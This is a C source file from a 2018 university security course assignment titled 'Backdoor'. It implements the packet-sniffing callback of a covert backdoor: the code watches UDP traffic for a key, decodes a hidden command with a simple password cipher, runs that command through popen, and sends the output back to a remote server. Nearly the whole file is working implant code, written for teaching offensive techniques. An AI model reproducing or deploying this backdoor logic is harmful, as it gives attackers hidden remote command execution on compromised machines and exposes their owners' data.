// Name:    Brandon Gillespie and Justen DePourcq
// Date:    October 19th, 2018
// Class:   COMP8505
// Assn:    Assignment 3 - Backdoor
// Purpose: This program holds the callback function used in backdoor_client.c, in the pcap_loop
// function.
// NOTE: GIVEN TO US BY AMAN ABDULLAH, MODIFIED BY US.

// Include statements.
#include "pkt_sniffer.h"

// Define statements.
#define ETHER_IP_UDP_LEN 42
#define MAX_SIZE 65000
#define MAXLEN 65000
#define LINESIZE 256
#define COMMAND_START "start["
#define COMMAND_END "]end"
#define PASSWORD "password"

// packet_handler callback function.
void packet_handler(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet) {
  // Initialize variables.
  printf("Enter packet handler\n");
	int len, loop;
	char *ptr, *ptr2;
	char decrypt[MAX_SIZE], command[MAX_SIZE], buff[MAXLEN], path[LINESIZE];
  FILE *fp;

  // Cast send_struct back.
  struct send_struct * ss = (struct send_struct *)(ptrnull);

	/* Step 1: locate the payload portion of the packet */
	ptr = (char *)(packet + ETHER_IP_UDP_LEN);
	if ((pkt_info->caplen - ETHER_IP_UDP_LEN - 14) <= 0) {
		return;
  }

  printf("Pointer Value: %s\n", ptr);

	/* Step 2: check payload for backdoor header key */
	if (0 != memcmp(ptr, ss->key, ss->klen)) {
		return;
  }
	ptr += ss->klen;
	len = (pkt_info->caplen - ETHER_IP_UDP_LEN - ss->klen);
	memset(decrypt, 0x0, sizeof(decrypt));

  printf("Passed Header Key\n");

	/* Step 3: decrypt the payload by a minus 5 character shift */
  int p_index = 0;
	for (loop = 0; loop < len; loop++) {
    //decrypt[loop] = ptr[loop] + 5;
    int tmp = ptr[loop];
    tmp = (tmp * -1) + PASSWORD[p_index];
    decrypt[loop] = (char)tmp;
    ++p_index;
    if (p_index == (strlen(PASSWORD) - 1)) { p_index = 0; }
  }

  printf("Decrypt Buffer: %s\n\n\n", decrypt);

	/* Step 4: verify decrypted contents */
	if (!(ptr = strstr(decrypt, COMMAND_START))) {
		return;
  }
	ptr += strlen(COMMAND_START);
	if (!(ptr2 = strstr(ptr, COMMAND_END))) {
		return;
  }

	/* Step 5: extract the remainder */
	memset(command, 0x0, sizeof(command));
	strncpy(command, ptr, (ptr2 - ptr));

	/* Step 6: Execute the command */
  memset(buff, 0, sizeof(buff));

  /* Open the command for reading. */
  fp = popen(command, "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
  }

  /* Read the output a line at a time - output it. */
  while (fgets(path, sizeof(path)-1, fp) != NULL) {
    strcat(buff, path);
  }

  printf("%s\n", buff);

  // Send response.
  int server_len = sizeof(ss->server);
  if (sendto(ss->sd, buff, strlen(buff), 0, (struct sockaddr *)&(ss->server), server_len) == -1) {
    perror("sendto failure");
    exit(1);
  }

  /* close */
  pclose(fp);

	return;
}
